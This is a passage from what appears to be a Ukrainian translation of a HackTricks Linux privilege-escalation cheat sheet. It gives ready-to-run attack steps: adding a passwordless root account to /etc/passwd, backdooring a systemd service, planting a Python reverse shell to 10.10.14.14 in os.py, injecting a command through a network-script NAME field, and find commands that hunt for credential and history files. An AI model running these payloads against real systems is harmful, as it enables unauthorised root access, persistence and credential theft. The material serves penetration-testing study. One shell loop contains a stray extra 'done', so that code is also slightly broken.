hacker:GENERATED_PASSWORD_HERE:0:0:Hacker:/root:/bin/bash
```
Наприклад: `hacker:$1$hacker$TzyKlv0/R/c28R.GAeLw.1:0:0:Hacker:/root:/bin/bash`

Тепер ви можете використати команду `su` з `hacker:hacker`

Альтернативно, ви можете використати наступні рядки, щоб додати фіктивного користувача без пароля.\
УВАГА: це може знизити поточну безпеку машини.
```
echo 'dummy::0:0::/root:/bin/bash' >>/etc/passwd
su - dummy
```
ПРИМІТКА: На платформах BSD `/etc/passwd` розташований у `/etc/pwd.db` та `/etc/master.passwd`, також `/etc/shadow` перейменовано на `/etc/spwd.db`.

Вам слід перевірити, чи можете ви **записувати в деякі чутливі файли**. Наприклад, чи можете ви записати в якийсь **файл конфігурації сервісу**?
```bash
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' 2>/dev/null | grep -v '/proc/' | grep -v $HOME | sort | uniq #Find files owned by the user or writable by anybody
for g in `groups`; do find \( -type f -or -type d \) -group $g -perm -g=w 2>/dev/null | grep -v '/proc/' | grep -v $HOME; done #Find files writable by any group of the user
```
Наприклад, якщо на машині запущено сервер **tomcat** і ви можете **змінити файл конфігурації служби Tomcat всередині /etc/systemd/,** то ви можете змінити рядки:
```
ExecStart=/path/to/backdoor
User=root
Group=root
```
Ваш backdoor буде виконано наступного разу, коли tomcat буде запущено.

### Check Folders

Наступні каталоги можуть містити резервні копії або цікаву інформацію: **/tmp**, **/var/tmp**, **/var/backups, /var/mail, /var/spool/mail, /etc/exports, /root** (Можливо, ви не зможете прочитати останній, але спробуйте)
```bash
ls -a /tmp /var/tmp /var/backups /var/mail/ /var/spool/mail/ /root
```
### Дивне розташування/Owned файли
```bash
#root owned files in /home folders
find /home -user root 2>/dev/null
#Files owned by other users in folders owned by me
for d in `find /var /etc /home /root /tmp /usr /opt /boot /sys -type d -user $(whoami) 2>/dev/null`; do find $d ! -user `whoami` -exec ls -l {} \; 2>/dev/null; done
#Files owned by root, readable by me but not world readable
find / -type f -user root ! -perm -o=r 2>/dev/null
#Files owned by me or world writable
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
#Writable files by each group I belong to
for g in `groups`;
do printf "  Group $g:\n";
find / '(' -type f -or -type d ')' -group $g -perm -g=w ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
done
done
```
### Змінені файли за останні хвилини
```bash
find / -type f -mmin -5 ! -path "/proc/*" ! -path "/sys/*" ! -path "/run/*" ! -path "/dev/*" ! -path "/var/lib/*" 2>/dev/null
```
### Sqlite DB файли
```bash
find / -name '*.db' -o -name '*.sqlite' -o -name '*.sqlite3' 2>/dev/null
```
### \*\_history, .sudo_as_admin_successful, profile, bashrc, httpd.conf, .plan, .htpasswd, .git-credentials, .rhosts, hosts.equiv, Dockerfile, docker-compose.yml файли
```bash
find / -type f \( -name "*_history" -o -name ".sudo_as_admin_successful" -o -name ".profile" -o -name "*bashrc" -o -name "httpd.conf" -o -name "*.plan" -o -name ".htpasswd" -o -name ".git-credentials" -o -name "*.rhosts" -o -name "hosts.equiv" -o -name "Dockerfile" -o -name "docker-compose.yml" \) 2>/dev/null
```
### Приховані файли
```bash
find / -type f -iname ".*" -ls 2>/dev/null
```
### **Script/Binaries у PATH**
```bash
for d in `echo $PATH | tr ":" "\n"`; do find $d -name "*.sh" 2>/dev/null; done
for d in `echo $PATH | tr ":" "\n"`; do find $d -type f -executable 2>/dev/null; done
```
### **Веб-файли**
```bash
ls -alhR /var/www/ 2>/dev/null
ls -alhR /srv/www/htdocs/ 2>/dev/null
ls -alhR /usr/local/www/apache22/data/
ls -alhR /opt/lampp/htdocs/ 2>/dev/null
```
### **Резервні копії**
```bash
find /var /etc /bin /sbin /home /usr/local/bin /usr/local/sbin /usr/bin /usr/games /usr/sbin /root /tmp -type f \( -name "*backup*" -o -name "*\.bak" -o -name "*\.bck" -o -name "*\.bk" \) 2>/dev/null
```
### Відомі файли, що містять паролі

Перегляньте код [**linPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS), він шукає **кілька потенційних файлів, які можуть містити паролі**.\
**Інший цікавий інструмент**, який ви можете використати для цього: [**LaZagne**](https://github.com/AlessandroZ/LaZagne), який є додатком з відкритим кодом для витягнення великої кількості паролів, збережених на локальному комп'ютері для Windows, Linux & Mac.

### Логи

Якщо ви можете читати логи, ви можете знайти в них **цікаву/конфіденційну інформацію**. Чим дивніший лог, тим цікавішим він, ймовірно, буде.\
Також деякі "**bad**" сконфігуровані (backdoored?) **audit logs** можуть дозволити вам **записувати паролі** всередині audit logs, як пояснюється в цій публікації: [https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/](https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/).
```bash
aureport --tty | grep -E "su |sudo " | sed -E "s,su|sudo,${C}[1;31m&${C}[0m,g"
grep -RE 'comm="su"|comm="sudo"' /var/log* 2>/dev/null
```
Щоб **читати логи**, група [**adm**](interesting-groups-linux-pe/index.html#adm-group) буде дуже корисною.

### Shell files
```bash
~/.bash_profile # if it exists, read it once when you log in to the shell
~/.bash_login # if it exists, read it once if .bash_profile doesn't exist
~/.profile # if it exists, read once if the two above don't exist
/etc/profile # only read if none of the above exists
~/.bashrc # if it exists, read it every time you start a new shell
~/.bash_logout # if it exists, read when the login shell exits
~/.zlogin #zsh shell
~/.zshrc #zsh shell
```
### Загальний пошук Creds/Regex

Ви також повинні перевіряти файли, які містять слово "**password**" у своїй **назві** або в **вмісті**, а також перевіряти IPs і emails у логах, або hashes regexps.\
Я не буду тут перераховувати, як робити все це, але якщо вам цікаво, ви можете перевірити останні перевірки, які виконує [**linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/linPEAS/linpeas.sh).

## Файли з правом запису

### Python library hijacking

Якщо ви знаєте з **де** буде виконуватися python script і ви **можете записувати** в ту папку або можете **змінювати python libraries**, ви можете змінити OS library і встановити backdoor (якщо ви можете писати туди, де python script буде виконуватися, скопіюйте та вставте бібліотеку os.py).

Щоб **backdoor the library** просто додайте в кінець бібліотеки os.py наступний рядок (change IP and PORT):
```python
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.14",5678));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
```
### Експлуатація logrotate

Уразливість у `logrotate` дозволяє користувачам з **правами запису** у лог-файл або в батьківські директорії потенційно отримати підвищені привілеї. Це відбувається тому, що `logrotate`, який часто працює як **root**, можна змусити виконати довільні файли, особливо в директоріях на кшталт _**/etc/bash_completion.d/**_. Важливо перевіряти права не лише в _/var/log_, а й у будь-якій директорії, де застосовується ротація логів.

> [!TIP]
> Ця уразливість впливає на `logrotate` версії `3.18.0` і старіші

Більш детальну інформацію про уразливість можна знайти на цій сторінці: [https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition](https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition).

Цю уразливість можна експлуатувати за допомогою [**logrotten**](https://github.com/whotwagner/logrotten).

Ця уразливість дуже схожа на [**CVE-2016-1247**](https://www.cvedetails.com/cve/CVE-2016-1247/) **(nginx logs),** тож коли ви виявите, що можете змінювати логи, перевірте, хто ними керує, і чи можна ескалувати привілеї, замінивши логи на symlinks.

### /etc/sysconfig/network-scripts/ (Centos/Redhat)

**Посилання на уразливість:** [**https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f**](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)

Якщо з якоїсь причини користувач може **записати** скрипт `ifcf-<whatever>` у _/etc/sysconfig/network-scripts_ **або** відкоригувати існуючий, тоді ваша **system is pwned**.

Network scripts, _ifcg-eth0_, наприклад, використовуються для мережевих підключень. Вони виглядають точно як .INI файли. Однак вони \~sourced\~ в Linux Network Manager (dispatcher.d).

У моєму випадку атрибут `NAME=` в цих network scripts обробляється некоректно. Якщо в назві є **пробіл/blank space в назві, система намагається виконати частину після пробілу**. Це означає, що **все після першого пробілу виконується як root**.

Наприклад: _/etc/sysconfig/network-scripts/ifcfg-1337_
```bash
NAME=Network /bin/id
ONBOOT=yes
DEVICE=eth0
```
(_Зверніть увагу на пробіл між Network та /bin/id_)

### **init, init.d, systemd, та rc.d**

The directory `/etc/init.d` is home to **scripts** for System V init (SysVinit), the **classic Linux service management system**. It includes scripts to `start`, `stop`, `restart`, and sometimes `reload` services. These can be executed directly or through symbolic links found in `/etc/rc?.d/`. An alternative path in Redhat systems is `/etc/rc.d/init.d`.

On the other hand, `/etc/init` is associated with **Upstart**, a newer **service management** introduced by Ubuntu, using configuration files for service management tasks. Despite the transition to Upstart, SysVinit scripts are still utilized alongside Upstart configurations due to a compatibility layer in Upstart.

**systemd** emerges as a modern initialization and service manager, offering advanced features such as on-demand daemon starting, automount management, and system state snapshots. It organizes files into `/usr/lib/systemd/` for distribution packages and `/etc/systemd/system/` for administrator modifications, streamlining the system administration process.

## Інші трюки

### NFS Privilege escalation


{{#ref}}
nfs-no_root_squash-misconfiguration-pe.md
{{#endref}}

### Escaping from restricted Shells


{{#ref}}
escaping-from-limited-bash.md
{{#endref}}

### Cisco - vmanage


{{#ref}}
cisco-vmanage.md
{{#endref}}

## Android rooting frameworks: manager-channel abuse

Android rooting frameworks commonly hook a syscall to expose privileged kernel functionality to a userspace manager. Weak manager authentication (e.g., signature checks based on FD-order or poor password schemes) can enable a local app to impersonate the manager and escalate to root on already-rooted devices. Learn more and exploitation details here:


{{#ref}}
android-rooting-frameworks-manager-auth-bypass-syscall-hook.md
{{#endref}}

## VMware Tools service discovery LPE (CWE-426) via regex-based exec (CVE-2025-41244)

Regex-driven service discovery in VMware Tools/Aria Operations can extract a binary path from process command lines and execute it with -v under a privileged context. Permissive patterns (e.g., using \S) may match attacker-staged listeners in writable locations (e.g., /tmp/httpd), leading to execution as root (CWE-426 Untrusted Search Path).

Learn more and see a generalized pattern applicable to other discovery/monitoring stacks here:

{{#ref}}
vmware-tools-service-discovery-untrusted-search-path-cve-2025-41244.md
{{#endref}}

## Kernel Security Protections

- [https://github.com/a13xp0p0v/kconfig-hardened-check](https://github.com/a13xp0p0v/kconfig-hardened-check)
- [https://github.com/a13xp0p0v/linux-kernel-defence-map](https://github.com/a13xp0p0v/linux-kernel-defence-map)

## Додаткова допомога

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## Linux/Unix Privesc Tools

### **Найкращий інструмент для пошуку локальних privilege escalation векторів у Linux:** [**LinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)

**LinEnum**: [https://github.com/rebootuser/LinEnum](https://github.com/rebootuser/LinEnum)(-t option)\
**Enumy**: [https://github.com/luke-goddard/enumy](https://github.com/luke-goddard/enumy)\
**Unix Privesc Check:** [http://pentestmonkey.net/tools/audit/unix-privesc-check](http://pentestmonkey.net/tools/audit/unix-privesc-check)\
**Linux Priv Checker:** [www.securitysift.com/download/linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py)\
**BeeRoot:** [https://github.com/AlessandroZ/BeRoot/tree/master/Linux](https://github.com/AlessandroZ/BeRoot/tree/master/Linux)\
**Kernelpop:** Перераховує вразливості ядра у Linux та macOS [https://github.com/spencerdodd/kernelpop](https://github.com/spencerdodd/kernelpop)\
**Mestaploit:** _**multi/recon/local_exploit_suggester**_\
**Linux Exploit Suggester:** [https://github.com/mzet-/linux-exploit-suggester](https://github.com/mzet-/linux-exploit-suggester)\
**EvilAbigail (фізичний доступ):** [https://github.com/GDSSecurity/EvilAbigail](https://github.com/GDSSecurity/EvilAbigail)\
**Recopilation of more scripts**: [https://github.com/1N3/PrivEsc](https://github.com/1N3/PrivEsc)

## Посилання

- [0xdf – HTB Planning (Crontab UI privesc, zip -P creds reuse)](https://0xdf.gitlab.io/2025/09/13/htb-planning.html)
- [0xdf – HTB Era: forged .text_sig payload for cron-executed monitor](https://0xdf.gitlab.io/2025/11/29/htb-era.html)
- [0xdf – Holiday Hack Challenge 2025: Neighborhood Watch Bypass (sudo env_keep PATH hijack)](https://0xdf.gitlab.io/holidayhack2025/act1/neighborhood-watch)
- [alseambusher/crontab-ui](https://github.com/alseambusher/crontab-ui)
- [https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)
- [https://payatu.com/guide-linux-privilege-escalation/](https://payatu.com/guide-linux-privilege-escalation/)
- [https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744](https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744)
- [http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html](http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html)
- [https://touhidshaikh.com/blog/?p=827](https://touhidshaikh.com/blog/?p=827)
- [https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf](https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf)
- [https://github.com/frizb/Linux-Privilege-Escalation](https://github.com/frizb/Linux-Privilege-Escalation)
- [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits)
- [https://github.com/rtcrowley/linux-private-i](https://github.com/rtcrowley/linux-private-i)
- [https://www.linux.com/news/what-socket/](https://www.linux.com/news/what-socket/)
- [https://muzec0318.github.io/posts/PG/peppo.html](https://muzec0318.github.io/posts/PG/peppo.html)
- [https://www.linuxjournal.com/article/7744](https://www.linuxjournal.com/article/7744)
- [https://blog.certcube.com/suid-executables-linux-privilege-escalation/](https://blog.certcube.com/suid-executables-linux-privilege-escalation/)
- [https://juggernaut-sec.com/sudo-part-2-lpe](https://juggernaut-sec.com/sudo-part-2-lpe)
- [https://linuxconfig.org/how-to-manage-acls-on-linux](https://linuxconfig.org/how-to-manage-acls-on-linux)
- [https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)
- [https://www.linode.com/docs/guides/what-is-systemd/](https://www.linode.com/docs/guides/what-is-systemd/)
- [0xdf – HTB Eureka (bash arithmetic injection via logs, overall chain)](https://0xdf.gitlab.io/2025/08/30/htb-eureka.html)
- [GNU Bash Manual – BASH_ENV (non-interactive startup file)](https://www.gnu.org/software/bash/manual/bash.html#index-BASH_005fENV)
- [0xdf – HTB Environment (sudo env_keep BASH_ENV → root)](https://0xdf.gitlab.io/2025/09/06/htb-environment.html)
- [0xdf – HTB Previous (sudo terraform dev_overrides + TF_VAR symlink privesc)](https://0xdf.gitlab.io/2026/01/10/htb-previous.html)
- [NVISO – You name it, VMware elevates it (CVE-2025-41244)](https://blog.nviso.eu/2025/09/29/you-name-it-vmware-elevates-it-cve-2025-41244/)

{{#include ../../banners/hacktricks-training.md}}
